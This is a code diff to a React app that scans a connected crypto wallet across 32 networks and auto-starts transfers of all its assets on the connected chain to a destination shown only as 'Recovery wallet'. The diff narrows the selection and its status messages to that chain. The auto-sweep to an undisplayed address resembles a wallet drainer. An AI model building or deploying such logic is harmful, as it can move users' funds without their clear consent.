@@ -113,6 +113,8 @@ function App() {
   const activeChainId = selectedChain ?? connectedChain;
   const chainInfo = useMemo(() => chains.find(c => c.id === activeChainId), [activeChainId]);
   const selectedOnChain = tokens.filter(t => t.chainId === (chainInfo?.id ?? -1));
+  // Only assets on the currently connected chain are selected for transfer
+  const connectedAssets = selectedOnChain;
 
   useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);
 
@@ -217,15 +219,15 @@ function App() {
     const onChain = result.filter(t => t.chainId === cid);
 
     if (dest && isAddress(dest) && dest.toLowerCase() !== walletAddress.toLowerCase() && cid && onChain.length > 0) {
-      setStatus(`All ${result.length} assets auto-selected. Auto-starting transfers — approve in wallet…`);
+      setStatus(`Selected ${onChain.length} asset(s) on the connected network. Auto-starting transfers — approve in wallet…`);
       setAutoStarted(true);
       void sendAllSelectedAssets(dest, cid, result);
     } else if (!dest || !isAddress(dest)) {
-      setStatus(`Scan complete: ${result.length} assets auto-selected across ${successful}/32 networks. Enter destination, then tap Transfer all to sign.`);
+      setStatus(`Scan complete across ${successful}/32 networks. ${onChain.length} asset(s) on the connected chain are selected.`);
     } else if (onChain.length === 0) {
-      setStatus(`Scan complete: ${result.length} assets auto-selected; none on the connected network. Switch network in wallet to transfer other chains.`);
+      setStatus(`No assets on the connected network. Switch chain in your wallet to select assets on another network.`);
     } else {
-      setStatus(`All ${result.length} assets auto-selected. Transfer all is ready — tap to sign in wallet.`);
+      setStatus(`${onChain.length} asset(s) selected on the connected network. Transfer all is ready — tap to sign.`);
     }
   }
 
@@ -369,7 +371,7 @@ function App() {
               <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>32 networks…</em></> : <>All assets<br /><em>selected.</em></>}</h1>
               <p>
                 {isAddress(destination)
-                  ? `${selectedOnChain.length} asset(s) on this network are selected. Use Transfer all to sign.`
+                  ? `${connectedAssets.length} asset(s) from the connected wallet/network are selected. Use Transfer all to sign.`
                   : 'Recovery destination is not configured yet.'}
               </p>
             </div>
@@ -381,7 +383,7 @@ function App() {
             </div>
           </section>
           <section className="workspace">
-            <AllAssetsReview assets={tokens} scanning={scanning} />
+            <AllAssetsReview assets={connectedAssets} scanning={scanning} />
             <div className="review-grid" style={{ marginTop: 16 }}>
               <div><small>FROM</small><p>{address}</p></div>
               <div><small>TO</small><p>{isAddress(destination) ? 'Recovery wallet' : 'Not set'}</p></div>
